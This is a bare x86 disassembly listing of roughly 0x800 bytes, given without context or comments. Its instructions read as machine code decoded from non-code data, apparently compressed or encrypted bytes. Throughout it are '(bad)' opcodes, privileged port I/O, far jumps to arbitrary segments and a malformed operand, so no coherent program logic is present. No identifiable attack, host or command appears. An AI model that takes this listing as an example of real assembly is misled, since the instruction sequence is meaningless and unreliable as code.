  408ada:	mov    ebx,0x92afb98e
  408adf:	xchg   DWORD PTR [ebp+0x2db09a8c],ebx
  408ae5:	loopne 0x408adb
  408ae7:	xor    dh,bl
  408ae9:	in     eax,0x29
  408aeb:	in     eax,0xe7
  408aed:	sbb    BYTE PTR [ecx],0xb3
  408af0:	les    ebx,FWORD PTR [ebx+0x1bc3654f]
  408af6:	inc    ecx
  408af7:	dec    ebx
  408af8:	and    al,0xce
  408afa:	adc    eax,0xb9d8242b
  408aff:	das    
  408b00:	mov    ch,0xd4
  408b02:	outs   dx,DWORD PTR ds:[esi]
  408b03:	cmp    dh,dl
  408b05:	jb     0x408ae8
  408b07:	inc    esp
  408b08:	xchg   edi,eax
  408b09:	and    eax,0x5a6f3db4
  408b0e:	adc    ch,BYTE PTR [ebx-0x7ad3ebbd]
  408b14:	ins    DWORD PTR es:[edi],dx
  408b15:	xchg   esi,eax
  408b16:	mov    ebp,0x1c747805
  408b1b:	pop    ecx
  408b1c:	mov    cl,0x3b
  408b1e:	mov    ch,BYTE PTR [ebx-0x5dc6b9ca]
  408b24:	adc    DWORD PTR [ebp-0x6b],esp
  408b27:	cmc    
  408b28:	jb     0x408b1c
  408b2a:	push   edx
  408b2b:	clc    
  408b2c:	in     al,0x27
  408b2e:	inc    esi
  408b2f:	sbb    ah,0xe5
  408b32:	imul   esi,DWORD PTR [ebx],0x9878ad00
  408b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b39:	xor    al,0xd
  408b3b:	dec    esp
  408b3c:	inc    ebp
  408b3d:	test   al,0xea
  408b3f:	jge    0x408b62
  408b41:	lds    ebx,FWORD PTR [edi]
  408b43:	and    BYTE PTR [ecx+0xb8c335b],ah
  408b49:	dec    eax
  408b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b4b:	xchg   edi,eax
  408b4c:	ret    
  408b4d:	stc    
  408b4e:	and    edi,DWORD PTR [ebx+ebx*8]
  408b51:	mov    al,0x77
  408b53:	add    al,0x9a
  408b55:	mov    al,0x64
  408b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b59:	push   ds
  408b5a:	arpl   ax,bx
  408b5c:	mov    ebp,0xfe789ff6
  408b61:	pop    es
  408b62:	xlat   BYTE PTR ds:[ebx]
  408b63:	ja     0x408b9f
  408b65:	(bad)  
  408b67:	add    al,0x8b
  408b69:	sbb    eax,0x7fd90a96
  408b6e:	xchg   edi,eax
  408b6f:	mov    esi,0x11aaff23
  408b74:	cmp    esi,esp
  408b76:	xor    DWORD PTR [eax-0x4b6214de],ebx
  408b7c:	inc    eax
  408b7d:	add    BYTE PTR [ebx+0x51c34c8b],bl
  408b83:	test   eax,0xeb9c38a7
  408b88:	scas   al,BYTE PTR es:[edi]
  408b89:	push   ecx
  408b8a:	push   esp
  408b8b:	xor    BYTE PTR [edx+0x70a86bed],al
  408b91:	jno    0x408ba1
  408b93:	fadd   st,st(6)
  408b95:	mov    cl,0x15
  408b97:	adc    al,0xac
  408b99:	add    bl,BYTE PTR [ecx]
  408b9b:	int    0x61
  408b9d:	pop    ds
  408b9e:	xlat   BYTE PTR ds:[ebx]
  408b9f:	cld    
  408ba0:	or     eax,0x4f682996
  408ba5:	push   edi
  408ba6:	xchg   edi,eax
  408ba7:	popf   
  408ba8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ba9:	and    ebx,edx
  408bab:	sbb    BYTE PTR [edi-0x6],0x98
  408baf:	call   0x42ca:0x5ab0ad75
  408bb6:	and    al,0x34
  408bb8:	ins    BYTE PTR es:[edi],dx
  408bb9:	dec    edx
  408bba:	addr16 push ecx
  408bbc:	mov    al,es:0xe166f2d0
  408bc2:	js     0x408b55
  408bc4:	rcr    BYTE PTR [eax],cl
  408bc6:	repz shl BYTE PTR ds:0xa6c4db4,cl
  408bcd:	add    eax,esp
  408bcf:	or     eax,0x69e1c4b2
  408bd4:	retf   
  408bd5:	fidiv  WORD PTR [eax-0x61678259]
  408bdb:	dec    esi
  408bdc:	fldcw  WORD PTR [edi-0x59057589]
  408be2:	(bad)  
  408be3:	cli    
  408be4:	sub    BYTE PTR [edx-0x36],ch
  408be7:	pop    esp
  408be8:	int    0xbf
  408bea:	cmp    DWORD PTR [eax],esi
  408bec:	mov    al,ds:0xc03e14a2
  408bf1:	and    dh,BYTE PTR [eax]
  408bf3:	fsubr  QWORD PTR [edx]
  408bf5:	and    ah,cl
  408bf7:	add    bh,dh
  408bf9:	add    al,0xf3
  408bfb:	cld    
  408bfc:	pop    esi
  408bfd:	ror    DWORD PTR [esi],1
  408bff:	ret    0x2031
  408c02:	xor    BYTE PTR [eax*1-0x38155ff8],al
  408c09:	push   es
  408c0a:	jmp    0xf610e2d0
  408c0f:	in     al,dx
  408c10:	inc    ecx
  408c11:	sbb    al,0x51
  408c13:	fwait
  408c14:	pop    ebp
  408c15:	xor    ah,bh
  408c17:	scas   al,BYTE PTR es:[edi]
  408c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c19:	push   edi
  408c1a:	mov    dl,0xa9
  408c1c:	aaa    
  408c1d:	mov    ah,0x13
  408c1f:	fdivr  DWORD PTR ds:0x253704f6
  408c25:	xor    eax,DWORD PTR [ebp-0x75]
  408c28:	(bad)  
  408c29:	push   ds
  408c2a:	or     DWORD PTR [edi+0x19],0xc6192e3a
  408c31:	cmc    
  408c32:	pop    es
  408c33:	mov    cl,dl
  408c35:	mov    esi,0x73e7bac2
  408c3a:	arpl   WORD PTR [ecx+0x244a4dea],si
  408c40:	loope  0x408bda
  408c42:	mov    ah,0x74
  408c44:	daa    
  408c45:	mov    esp,0x769c06bc
  408c4a:	ret    
  408c4b:	xor    ah,BYTE PTR [ecx]
  408c4d:	inc    esi
  408c4e:	adc    eax,0xc48c0209
  408c53:	mul    DWORD PTR [esp+eax*8-0x21]
  408c57:	cld    
  408c58:	mov    bl,0xd
  408c5a:	je     0x408c0a
  408c5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c5d:	and    eax,0x458e36ed
  408c62:	call   0xafe1b525
  408c67:	test   eax,0x11eb6aeb
  408c6c:	and    BYTE PTR [esp+edi*1+0x7695fedd],dh
  408c73:	repz mov esi,0xbe67f2a8
  408c79:	xlat   BYTE PTR ds:[ebx]
  408c7a:	mov    eax,0xdb5e624e
  408c7f:	sub    DWORD PTR [esi-0x6],edi
  408c82:	hlt    
  408c83:	or     cl,BYTE PTR [eax-0x15ba6a18]
  408c89:	and    al,0x4b
  408c8b:	pop    eax
  408c8c:	mov    cl,BYTE PTR [ecx+edx*4-0x36]
  408c90:	mov    dl,0xaa
  408c92:	ret    0x6902
  408c95:	hlt    
  408c96:	sbb    DWORD PTR [edx+0x17],esi
  408c99:	sbb    eax,0x6831d538
  408c9e:	loop   0x408d1b
  408ca0:	shl    DWORD PTR [ecx-0x74],1
  408ca3:	dec    ebp
  408ca4:	sahf   
  408ca5:	daa    
  408ca6:	mov    edi,0x8c49b561
  408cab:	gs jns 0x408c6f
  408cae:	ja     0x408d23
  408cb0:	push   edx
  408cb1:	mov    dh,0xa7
  408cb3:	jno    0x408cb9
  408cb5:	and    DWORD PTR [ecx],0xc2ccfce3
  408cbb:	push   ss
  408cbc:	push   0x2
  408cbe:	lock das 
  408cc0:	test   edi,0xd94de2f
  408cc6:	scas   al,BYTE PTR es:[edi]
  408cc7:	xchg   esp,eax
  408cc8:	cwde   
  408cc9:	stos   DWORD PTR es:[edi],eax
  408cca:	retf   
  408ccb:	pop    es
  408ccc:	xor    edx,DWORD PTR [esi-0x791355b5]
  408cd2:	ins    DWORD PTR es:[edi],dx
  408cd3:	les    esi,FWORD PTR ds:0x9a553468
  408cd9:	mov    al,ds:0x3362f74c
  408cde:	cmp    BYTE PTR [esi+0x7d6075ca],0x40
  408ce5:	and    dl,bl
  408ce7:	aad    0x8b
  408ce9:	(bad)  
  408cea:	outs   dx,DWORD PTR ds:[esi]
  408ceb:	imul   BYTE PTR [ebx+0x32]
  408cee:	mov    bh,0x24
  408cf0:	inc    ebx
  408cf1:	jecxz  0x408c9b
  408cf3:	shl    ecx,0x0
  408cf6:	adc    dl,BYTE PTR [ebp-0x67860031]
  408cfc:	xchg   esi,eax
  408cfd:	push   ss
  408cfe:	aam    0xda
  408d00:	icebp  
  408d01:	imul   edx,DWORD PTR [edi-0x43d6b810],0xffffff8a
  408d08:	loop   0x408d1a
  408d0a:	cli    
  408d0b:	sub    BYTE PTR [eax-0x1d],0xd2
  408d0f:	dec    ebp
  408d10:	sbb    BYTE PTR [esi-0x13f3a0dd],al
  408d16:	jb     0x408d47
  408d18:	and    eax,0xc59e0a85
  408d1d:	and    esi,DWORD PTR [ecx-0x51f69627]
  408d23:	shr    edi,1
  408d25:	push   esi
  408d26:	fcomp  QWORD PTR [ecx+0x2f]
  408d29:	dec    esp
  408d2a:	push   edi
  408d2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d2c:	fadd   DWORD PTR [ebp-0x1a]
  408d2f:	int    0xf2
  408d31:	fldenv [ebx]
  408d33:	fmul   DWORD PTR [eax-0xc67c183]
  408d39:	ins    DWORD PTR es:[edi],dx
  408d3a:	jp     0x408db5
  408d3c:	xor    eax,0xc8768375
  408d41:	jmp    0x408cc3
  408d43:	ror    ecx,0xf
  408d46:	push   ss
  408d47:	mov    ebx,0xc04499a
  408d4c:	add    WORD PTR [esi+ebx*4-0x189f12f3],0x3de8
  408d56:	rol    dl,1
  408d58:	pop    esp
  408d59:	loope  0x408d12
  408d5b:	dec    esp
  408d5c:	sti    
  408d5d:	addr16 dec ecx
  408d5f:	jne    0x408d1c
  408d61:	inc    ecx
  408d62:	sbb    eax,0xb13cf0c6
  408d67:	les    eax,FWORD PTR [ebx]
  408d69:	and    dl,bh
  408d6b:	mov    edi,0xb6d50d45
  408d70:	ja     0x408de5
  408d72:	pusha  
  408d73:	sub    bh,BYTE PTR [ebp-0x5c2ddde]
  408d79:	mov    ebp,0xda45bd5d
  408d7e:	ja     0x408de0
  408d80:	adc    esp,DWORD PTR [ecx-0x1a]
  408d83:	inc    ebp
  408d84:	mov    al,0xa6
  408d86:	or     al,BYTE PTR [eax]
  408d88:	push   ss
  408d89:	outs   dx,BYTE PTR ds:[esi]
  408d8a:	inc    eax
  408d8b:	jp     0x408db9
  408d8d:	inc    ebp
  408d8e:	push   ss
  408d8f:	add    al,0x7f
  408d91:	test   al,0x22
  408d93:	daa    
  408d94:	and    BYTE PTR [esi+esi*8],0x1b
  408d98:	and    BYTE PTR [edi],bh
  408d9a:	out    dx,al
  408d9b:	add    DWORD PTR [ebx],ecx
  408d9d:	cmp    ah,BYTE PTR [ecx-0xca6b875]
  408da3:	(bad)  
  408da4:	fcmovu st,st(5)
  408da6:	xchg   ecx,eax
  408da7:	ret    0x8027
  408daa:	fcmove st,st(7)
  408dac:	xor    al,0xc5
  408dae:	lock and ebp,DWORD PTR [eax+eiz*2+0x71]
  408db3:	mov    dl,0x17
  408db5:	dec    edi
  408db6:	add    bh,ah
  408db8:	sub    dl,BYTE PTR [ecx]
  408dba:	mov    BYTE PTR [eax+0x7854dd43],bh
  408dc0:	into   
  408dc1:	mov    al,0x4e
  408dc3:	push   eax
  408dc4:	fs enter 0xf90e,0x8e
  408dc9:	xchg   ebp,eax
  408dca:	pop    ecx
  408dcb:	test   al,0xbe
  408dcd:	mov    ebp,0xdb39befd
  408dd2:	pop    ebp
  408dd3:	dec    edx
  408dd4:	mov    esp,DWORD PTR [edx]
  408dd6:	xchg   ecx,eax
  408dd7:	xchg   esp,eax
  408dd8:	jo     0x408dac
  408dda:	mov    es:0x9507780d,eax
  408de0:	fisttp DWORD PTR [eax]
  408de2:	ficomp DWORD PTR [edi]
  408de4:	loopne 0x408e03
  408de6:	add    bl,BYTE PTR [edx-0x555c73df]
  408dec:	jle    0x408e3c
  408dee:	cmp    DWORD PTR [esi+0x2533a1b1],ebp
  408df4:	hlt    
  408df5:	adc    esi,DWORD PTR [edx-0x35]
  408df8:	rcr    BYTE PTR [ebx],1
  408dfa:	jns    0x408e0e
  408dfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dfd:	xor    DWORD PTR [esi-0x24fdb06e],esi
  408e03:	les    edi,FWORD PTR [edi-0x70]
  408e06:	fcmovnb st,st(1)
  408e08:	sub    BYTE PTR [eax],ch
  408e0a:	inc    ebp
  408e0b:	call   0x8e878bbe
  408e10:	rcl    BYTE PTR [edx+0x1229cb3c],1
  408e16:	outs   dx,DWORD PTR ds:[esi]
  408e17:	xor    BYTE PTR [esi+0x1f12491a],0x97
  408e1e:	push   ebx
  408e1f:	adc    ah,bl
  408e21:	loop   0x408e8d
  408e23:	xor    edx,DWORD PTR [ecx]
  408e25:	lock xchg esp,eax
  408e27:	cld    
  408e28:	xor    edi,DWORD PTR [edx+0xa]
  408e2b:	jge    0x408dfb
  408e2d:	push   ecx
  408e2e:	sar    BYTE PTR [edi],cl
  408e30:	mov    dl,0x48
  408e32:	loopne 0x408dff
  408e34:	cmc    
  408e35:	cmp    al,0x62
  408e37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e38:	xor    ecx,DWORD PTR [esi+0x8]
  408e3b:	mov    BYTE PTR [ebp+0x1637630c],bh
  408e41:	out    dx,eax
  408e42:	ss repz inc ebp
  408e45:	add    BYTE PTR [edx-0x63],bl
  408e48:	mov    DWORD PTR [esi-0x2],eax
  408e4b:	shr    edi,0x69
  408e4e:	in     eax,0x4b
  408e50:	sub    ebx,edi
  408e52:	scas   al,BYTE PTR es:[edi]
  408e53:	pop    es
  408e54:	lock nop
  408e56:	outs   dx,DWORD PTR ds:[esi]
  408e57:	fist   DWORD PTR [eax]
  408e59:	jle    0x408ebf
  408e5b:	call   FWORD PTR [edi-0x69]
  408e5e:	and    ch,dl
  408e60:	sub    ah,BYTE PTR [edi-0x44]
  408e63:	push   edi
  408e64:	inc    eax
  408e65:	or     eax,DWORD PTR [eax-0x691c9a26]
  408e6b:	mov    es,ebx
  408e6d:	stc    
  408e6e:	jmp    0x16788853
  408e73:	xchg   ebp,eax
  408e74:	inc    edi
  408e75:	or     ecx,DWORD PTR [edx]
  408e77:	retf   
  408e78:	ins    BYTE PTR es:[edi],dx
  408e79:	jae    0x408e52
  408e7b:	stos   DWORD PTR es:[edi],eax
  408e7c:	bnd jle 0x408e02
  408e7f:	sar    ebx,cl
  408e81:	jmp    0x408ede
  408e83:	and    BYTE PTR [ebp-0x72b1e982],bh
  408e89:	xor    eax,esp
  408e8b:	jg     0x408ee2
  408e8d:	push   ss
  408e8e:	add    al,dl
  408e90:	js     0x408ea0
  408e92:	pop    ss
  408e93:	xchg   BYTE PTR [edx+0x18],al
  408e96:	aaa    
  408e97:	mov    dl,0x27
  408e99:	call   0x635e:0xf63d8b8d
  408ea0:	jmp    0xba89:0xeac391e7
  408ea7:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ea9:	sub    al,bl
  408eab:	adc    ah,bh
  408ead:	repz fucomi st,st(0)
  408eb0:	xchg   BYTE PTR [ecx+0x557c1915],ch
  408eb6:	sub    ecx,DWORD PTR [eax+edi*1-0x19421cb3]
  408ebd:	sub    cl,BYTE PTR [edi-0xcdbac2f]
  408ec3:	stc    
  408ec4:	fldenv [eax+ebp*1]
  408ec7:	neg    BYTE PTR [ecx]
  408ec9:	jecxz  0x408e6c
  408ecb:	cmp    bl,BYTE PTR [ebx+eax*2]
  408ece:	mov    es,eax
  408ed0:	adc    eax,0xa5951320
  408ed5:	fwait
  408ed6:	jae    0x408e8b
  408ed8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ed9:	loopne 0x408f0e
  408edb:	sahf   
  408edc:	mov    edi,0x7d5b4786
  408ee1:	jno    0x408eb1
  408ee3:	in     eax,dx
  408ee4:	push   0xf44e258b
  408ee9:	gs test ebx,esi
  408eec:	and    DWORD PTR [ecx-0x24],esp
  408eef:	pop    ebp
  408ef0:	(bad)  
  408ef1:	gs xor al,dl
  408ef4:	push   eax
  408ef5:	pop    ebp
  408ef6:	(bad)  
  408ef7:	dec    esp
  408ef8:	mov    cx,WORD PTR [ebx]
  408efb:	xor    DWORD PTR [eax-0x28920e26],esp
  408f01:	sub    esp,DWORD PTR [edx]
  408f03:	jno    0x408e87
  408f05:	push   ecx
  408f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f07:	jp     0x408efe
  408f09:	mov    ds:0x516ff6c5,eax
  408f0e:	(bad)  
  408f0f:	retf   0x8565
  408f12:	push   0x5
  408f14:	jp     0x408ec8
  408f16:	std    
  408f17:	ret    
  408f18:	cli    
  408f19:	aad    0x7e
  408f1b:	mov    ds:0x4aef88a2,al
  408f20:	or     al,0xff
  408f22:	fwait
  408f23:	push   cs
  408f24:	pop    es
  408f25:	mov    eax,0x1f33d801
  408f2a:	adc    DWORD PTR [esi+0x30ac26df],0xffffffcc
  408f31:	and    al,0x82
  408f33:	push   esp
  408f34:	fdivr  DWORD PTR [edx]
  408f36:	pop    es
  408f37:	xchg   edi,eax
  408f38:	ret    0xb979
  408f3b:	dec    edx
  408f3c:	faddp  st(1),st
  408f3e:	pusha  
  408f3f:	sbb    edi,ecx
  408f41:	pop    es
  408f42:	mov    DWORD PTR [ebx-0x46bd6b3d],0xd8647f6e
  408f4c:	aas    
  408f4d:	push   ds
  408f4e:	jge    0x408ede
  408f50:	pop    ds
  408f51:	mov    al,BYTE PTR [ebx+eiz*4]
  408f54:	push   esp
  408f55:	(bad)  
  408f56:	xchg   ebp,eax
  408f57:	sbb    ebx,DWORD PTR [eax]
  408f59:	mov    ebx,0x1de7d9a2
  408f5e:	mov    cl,0x71
  408f60:	(bad)  
  408f61:	dec    esi
  408f62:	jae    0x408f59
  408f64:	xor    BYTE PTR [ebp+0x4eccf708],0xfe
  408f6b:	out    dx,al
  408f6c:	mov    bh,0x52
  408f6e:	pop    ebp
  408f6f:	xor    BYTE PTR [edi-0x74075b7b],ch
  408f75:	in     al,dx
  408f76:	jo     0x408f2a
  408f78:	jo     0x408fbd
  408f7a:	(bad)  
  408f7b:	jb     0x408f26
  408f7d:	jge    0x408f5b
  408f7f:	clc    
  408f80:	mov    ch,0x7a
  408f82:	int3   
  408f83:	les    ecx,FWORD PTR [ebx]
  408f85:	mov    eax,0x40226c28
  408f8a:	out    0x40,al
  408f8c:	mov    gs,WORD PTR [edx]
  408f8e:	retf   
  408f8f:	cmp    BYTE PTR [esp+esi*4-0x1657d775],dl
  408f96:	loopne 0x408f93
  408f98:	jb     0x408fbf
  408f9a:	out    0x1d,al
  408f9c:	mov    bh,0x6d
  408f9e:	sub    BYTE PTR [ecx-0x3fd86747],0x60
  408fa5:	ret    
  408fa6:	xor    eax,0x6bb4c617
  408fab:	xor    ch,BYTE PTR [eax]
  408fad:	mov    ds:0xef5c5732,al
  408fb2:	rcr    BYTE PTR [ebp-0xf521835],0x86
  408fb9:	ins    DWORD PTR es:[edi],dx
  408fba:	push   esi
  408fbb:	js     0x408fef
  408fbd:	and    eax,0xa4f6acaf
  408fc2:	inc    esp
  408fc3:	add    al,bl
  408fc5:	pop    esp
  408fc6:	stc    
  408fc7:	push   esp
  408fc8:	fadd   QWORD PTR [eax+edx*2-0x175d5dc4]
  408fcf:	jg     0x409027
  408fd1:	add    dh,BYTE PTR [esi]
  408fd3:	fld    TBYTE PTR [esi+0x9]
  408fd6:	popa   
  408fd7:	clc    
  408fd8:	sbb    BYTE PTR [edi-0x756f73f6],0xb3
  408fdf:	pop    edx
  408fe0:	rol    DWORD PTR [edi],1
  408fe2:	jecxz  0x408f6a
  408fe4:	int3   
  408fe5:	push   0x1b
  408fe7:	in     al,0x14
  408fe9:	xchg   DWORD PTR [ebx],ebp
  408feb:	mov    edx,0x7f156712
  408ff0:	loop   0x40903c
  408ff2:	rcl    DWORD PTR [eax-0x7e],cl
  408ff5:	dec    ecx
  408ff6:	mov    ch,0x33
  408ff8:	ret    0x447f
  408ffb:	xchg   DWORD PTR ds:0xea2b5a62,ecx
  409001:	popa   
  409002:	push   ds
  409003:	gs rol al,cl
  409006:	loopne 0x408fd8
  409008:	cmp    al,0x7a
  40900a:	push   0xfffffff7
  40900c:	jo     0x40902a
  40900e:	jne    0x40905e
  409010:	(bad)  
  409011:	imul   esp,DWORD PTR [ebp+0x1e],0x73
  409015:	mov    edi,DWORD PTR [edx-0x2c273cab]
  40901b:	inc    esp
  40901c:	int3   
  40901d:	in     al,0xb5
  40901f:	xlat   BYTE PTR ds:[ebx]
  409020:	cdq    
  409021:	icebp  
  409022:	jno    0x408ffc
  409024:	pinsrw mm6,ecx,0x7
  409028:	mov    ecx,0xa80d2d7e
  40902d:	bts    DWORD PTR [edi-0xf],esi
  409031:	inc    esi
  409032:	retw   
  409034:	cmp    al,0xe0
  409036:	jg     0x409025
  409038:	mov    dl,0xd9
  40903a:	pop    ecx
  40903b:	xor    eax,0x3a4c8f37
  409040:	xchg   esi,eax
  409041:	out    0x7,al
  409043:	push   esp
  409044:	and    bl,al
  409046:	out    dx,al
  409047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409048:	dec    ecx
  409049:	pop    ebp
  40904a:	ret    
  40904b:	jne    0x4090ad
  40904d:	mov    edx,0xa0215cf9
  409052:	cmp    al,0x4
  409054:	mov    ds:0x1404172c,eax
  409059:	push   es
  40905a:	push   ss
  40905b:	cmp    BYTE PTR [esi],bh
  40905d:	and    ch,BYTE PTR [ecx]
  40905f:	pop    ebp
  409060:	call   0x88c152dc
  409065:	je     0x409077
  409067:	push   ebx
  409068:	sbb    al,0x17
  40906a:	jb     0x4090d6
  40906c:	jmp    0xf6d6a761
  409071:	adc    dh,BYTE PTR [edi]
  409073:	bound  esi,QWORD PTR [ebp-0x4735ea14]
  409079:	mov    BYTE PTR [ecx],bl
  40907b:	dec    ebp
  40907c:	mov    ds:0x216979fa,al
  409081:	cmp    edx,DWORD PTR [edx+0x7e]
  409084:	mov    eax,0x1f59fa2c
  409089:	jne    0x4090b1
  40908b:	push   esp
  40908c:	pop    fs
  40908e:	mov    ecx,DWORD PTR [edi+0x42]
  409091:	test   al,0x85
  409093:	fisttp DWORD PTR [edx-0x793ad816]
  409099:	shl    DWORD PTR [eax],cl
  40909b:	ss mov ebp,0x5d4fd43f
  4090a1:	fimul  WORD PTR [ebp+ecx*2+0x8d8f1dc]
  4090a8:	add    DWORD PTR [ebp+eiz*8+0x644727af],ebx
  4090af:	or     eax,0x98f0287c
  4090b4:	(bad)
  4090b7:	imul   ebp,DWORD PTR [edi],0xac184db3
  4090bd:	pop    eax
  4090be:	dec    eax
  4090bf:	xlat   BYTE PTR ds:[ebx]
  4090c0:	fdiv   DWORD PTR [edx]
  4090c2:	ins    DWORD PTR es:[edi],dx
  4090c3:	xchg   esi,eax
  4090c4:	push   cs
  4090c5:	test   al,0x36
  4090c7:	out    dx,al
  4090c8:	fisttp WORD PTR ds:0x3a42d196
  4090ce:	add    bl,BYTE PTR [esp+ecx*8]
  4090d1:	clc    
  4090d2:	inc    DWORD PTR [ebx+0x11]
  4090d5:	bswap  ebx
  4090d7:	dec    edi
  4090d8:	mov    al,ds:0x6e8cf242
  4090dd:	sbb    bl,ah
  4090df:	std    
  4090e0:	adc    eax,0x76a24dd1
  4090e5:	mov    edx,0x8ea1e811
  4090ea:	daa    
  4090eb:	into   
  4090ec:	inc    ebx
  4090ed:	and    al,0x47
  4090ef:	cmp    al,0x38
  4090f1:	pop    edx
  4090f2:	ja     0x40911b
  4090f4:	adc    DWORD PTR [ecx-0x548830b1],esp
  4090fa:	pop    edi
  4090fb:	daa    
  4090fc:	(bad)  
  4090fd:	jg     0x409156
  4090ff:	lods   eax,DWORD PTR ds:[esi]
  409100:	imul   esi,DWORD PTR [edx+ebp*8],0x6c465ce0
  409107:	dec    eax
  409108:	dec    esi
  40910a:	and    al,0xda
  40910c:	or     BYTE PTR [edi],ch
  40910e:	push   0x7b
  409110:	int3   
  409111:	arpl   WORD PTR [eax+0x3f47c708],bx
  409117:	(bad)  
  409118:	sub    ecx,ecx
  40911a:	mov    esp,0x2d21e5ba
  40911f:	mov    BYTE PTR [ecx+esi*8-0x6f2b7649],ah
  409126:	aad    0x91
  409128:	and    al,0x3f
  40912a:	cwde   
  40912b:	adc    al,0xc6
  40912d:	jge    0x409107
  40912f:	repz scas eax,DWORD PTR es:[edi]
  409131:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409132:	ins    DWORD PTR es:[edi],dx
  409133:	and    DWORD PTR [ebx+0x5bbd954a],edi
  409139:	mov    edx,0xe5e6ace1
  40913e:	(bad)  
  40913f:	xchg   edi,eax
  409140:	dec    esp
  409141:	jnp    0x4090c4
  409143:	sbb    BYTE PTR [eax],0x8c
  409146:	rcr    BYTE PTR [esp+ebp*1],cl
  409149:	or     BYTE PTR [edx-0x2b720093],bh
  40914f:	push   ebx
  409150:	inc    edx
  409151:	pop    eax
  409152:	adc    BYTE PTR [eax],dh
  409154:	ss call 0x2f9903ce
  40915a:	ins    DWORD PTR es:[edi],dx
  40915b:	push   ebx
  40915c:	cs pop edx
  40915e:	dec    BYTE PTR [edx-0x5a]
  409161:	daa    
  409162:	iret   
  409163:	adc    DWORD PTR [ecx+edi*8],esp
  409166:	aam    0xcb
  409168:	push   edi
  409169:	inc    eax
  40916a:	dec    esi
  40916b:	sub    bl,bh
  40916d:	lods   eax,DWORD PTR ds:[esi]
  40916e:	pop    esp
  40916f:	xchg   DWORD PTR [edx],ebx
  409171:	test   DWORD PTR [edx-0x3c],esi
  409174:	inc    BYTE PTR [edi+0x67]
  409177:	push   es
  409178:	sbb    cl,BYTE PTR [ebp+eax*8-0xc]
  40917c:	(bad)
  409180:	jno    0x4091d2
  409182:	mov    al,0x46
  409184:	inc    eax
  409185:	inc    eax
  409186:	dec    ecx
  409187:	div    BYTE PTR [edx+ecx*2]
  40918a:	pushf  
  40918b:	leave  
  40918c:	push   ss
  40918d:	stc    
  40918e:	inc    ebx
  40918f:	cdq    
  409190:	lahf   
  409191:	sub    eax,0x222792a0
  409196:	aad    0x55
  409198:	icebp  
  409199:	std    
  40919a:	jmp    FWORD PTR [esi+0xc8c00f3]
  4091a0:	or     DWORD PTR [eax-0x6e],0xffffffaf
  4091a4:	dec    ecx
  4091a5:	add    eax,DWORD PTR [edx]
  4091a7:	shl    dl,0x1f
  4091aa:	sub    DWORD PTR [eax],ebp
  4091ac:	nop
  4091ad:	mov    edx,0x8250b6cc
  4091b2:	ins    DWORD PTR es:[edi],dx
  4091b3:	sbb    ebx,DWORD PTR [ebp-0x26]
  4091b6:	icebp  
  4091b7:	dec    edi
  4091b8:	jmp    0x2a64:0xb7b587bb
  4091bf:	push   eax
  4091c0:	xchg   edi,eax
  4091c1:	jp     0x4091ba
  4091c3:	popf   
  4091c4:	js     0x4091ce
  4091c6:	mov    BYTE PTR [edi+0x5a09e474],bl
  4091cc:	xchg   edi,eax
  4091cd:	xchg   ebx,eax
  4091ce:	shr    DWORD PTR [esi],cl
  4091d0:	(bad)  
  4091d1:	retf   0x5908
  4091d4:	dec    esp
  4091d5:	sti    
  4091d6:	test   al,0xa6
  4091d8:	popa   
  4091d9:	mov    dh,0xd0
  4091db:	das    
  4091dc:	jle    0x409174
  4091de:	dec    esi
  4091df:	push   cs
  4091e0:	pop    edx
  4091e1:	shl    BYTE PTR [ecx+0x55],0x74
  4091e5:	fild   QWORD PTR [edi-0x1c]
  4091e8:	sbb    BYTE PTR [edx],0xde
  4091eb:	mov    ebx,0x9f3936fe
  4091f0:	pop    eax
  4091f1:	jnp    0x4091dc
  4091f3:	adc    BYTE PTR [edx+0x369f2bec],dl
  4091f9:	loope  0x40922e
  4091fb:	fldenv [ebp+0x2b]
  4091fe:	ins    BYTE PTR es:[edi],dx
  4091ff:	or     ecx,DWORD PTR [ebx+0x28]
  409202:	ret    0x1df5
  409205:	jle    0x40926e
  409207:	in     al,0xdd
  409209:	mov    ecx,0x3f408828
  40920e:	sar    DWORD PTR [edi],cl
  409210:	sub    al,0xf9
  409212:	xor    al,0x20
  409214:	cmp    cl,BYTE PTR [ebp+0x64b0e1f5]
  40921a:	sbb    DWORD PTR [edi+0x47663cc2],0x32
  409221:	mov    ds:0x196712b7,al
  409226:	js     0x409217
  409228:	push   0x50
  40922a:	mov    ebp,0xce58c362
  40922f:	popf   
  409230:	in     al,0xa6
  409232:	add    BYTE PTR [edx],bh
  409234:	inc    ebx
  409235:	inc    esp
  409236:	dec    esp
  409237:	jae    0x4091d7
  409239:	dec    esi
  40923a:	ror    BYTE PTR [esp+eiz*4-0x4a],1
  40923e:	ret    
  40923f:	push   esp
  409240:	shl    BYTE PTR [edx-0x91e90c6],cl
  409246:	test   al,0x18
  409248:	inc    esi
  409249:	sub    eax,0x2476bd39
  40924e:	out    dx,al
  40924f:	in     eax,0x19
  409251:	loope  0x4092c3
  409253:	pop    eax
  409254:	sbb    eax,0x1f673767
  409259:	out    dx,al
  40925a:	sub    al,0xf
  40925c:	and    al,0xc3
  40925e:	xlat   BYTE PTR ds:[ebx]
  40925f:	(bad)  
  409260:	(bad)  
  409261:	(bad)  
  409262:	fidiv  DWORD PTR [ebp+0x43]
  409265:	mov    ?,edx
  409267:	cmp    BYTE PTR [edx],bl
  409269:	mov    WORD PTR [ecx+esi*8+0x7d],gs
  40926d:	nop
  40926e:	test   BYTE PTR [ebp-0xbf1d43b],ch
  409274:	jecxz  0x4092d0
  409276:	pop    ebp
  409278:	xlat   BYTE PTR ds:[ebx]
  409279:	push   0xcdb281ab
